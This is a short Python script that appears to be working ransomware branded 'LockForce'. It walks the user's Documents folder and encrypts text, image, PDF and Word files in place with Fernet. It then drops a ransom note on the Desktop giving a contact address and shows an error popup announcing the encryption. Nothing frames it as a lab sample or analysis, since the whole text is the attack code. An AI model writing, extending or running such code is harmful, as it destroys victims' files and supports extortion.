import os
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox
import time

# Target extension
EXTENSIONS = ['.txt', '.jpg', '.pdf', '.docx']

# Generate key
def generate_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

# Load key
def load_key():
    return open("key.key", "rb").read()

# Encrypt files
def encrypt_files(key):
    fernet = Fernet(key)
    folder_path = os.path.expanduser("~/Documents")
    for root, dirs, files in os.walk(folder_path):
        for file_name in files:
            if any(file_name.endswith(ext) for ext in EXTENSIONS):
                file_path = os.path.join(root, file_name)
                try:
                    with open(file_path, "rb") as file:
                        data = file.read()
                    encrypted_data = fernet.encrypt(data)
                    with open(file_path, "wb") as file:
                        file.write(encrypted_data)
                except Exception as e:
                    print(f"Error encrypting {file_path}: {e}")

# Create ransom note
def create_ransom_note():
    desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    note_path = os.path.join(desktop, "README_LOCKED.txt")
    with open(note_path, "w") as f:
        f.write("Your important files have been encrypted by LockForce.\n")
        f.write("To get them back, contact: lockforce@hacker.com\n")
        f.write("Without the decryption key, your files are useless.")

# Popup notification
def popup():
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror("LOCKFORCE ALERT", "Your files are encrypted! Check your Desktop!")

def main():
    if not os.path.exists("key.key"):
        generate_key()
    key = load_key()
    encrypt_files(key)
    create_ransom_note()
    popup()
    time.sleep(5)

if __name__ == "__main__":
    main()
